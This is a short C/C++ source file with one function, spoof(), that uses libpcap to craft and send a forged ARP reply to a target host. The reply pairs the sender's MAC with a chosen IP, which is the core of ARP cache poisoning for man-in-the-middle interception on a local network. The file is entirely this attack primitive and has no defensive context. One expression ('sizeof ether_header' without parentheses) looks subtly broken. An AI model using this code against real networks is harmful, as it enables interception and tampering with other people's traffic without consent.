#include "athena.h"

bool spoof(pcap_t* handle, uint8_t* targetMac, uint8_t* targetIp, uint8_t* mac, uint8_t* ip) {
    u_char buf[42];

    ether_header* eth = (ether_header*)buf;
    memcpy(eth->dest, targetMac, 6);
    memcpy(eth->src, mac, 6);
    eth->type = htons(0x0806);

    arp_header* arp = (arp_header*)(buf + sizeof ether_header);
    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->op = htons(2);
    memcpy(arp->src_mac, mac, 6);
    memcpy(arp->src_ip, ip, 4);
    memcpy(arp->t_mac, targetMac, 6);
    memcpy(arp->t_ip, targetIp, 4);

    return (pcap_sendpacket(handle, buf, 42) != -1);
}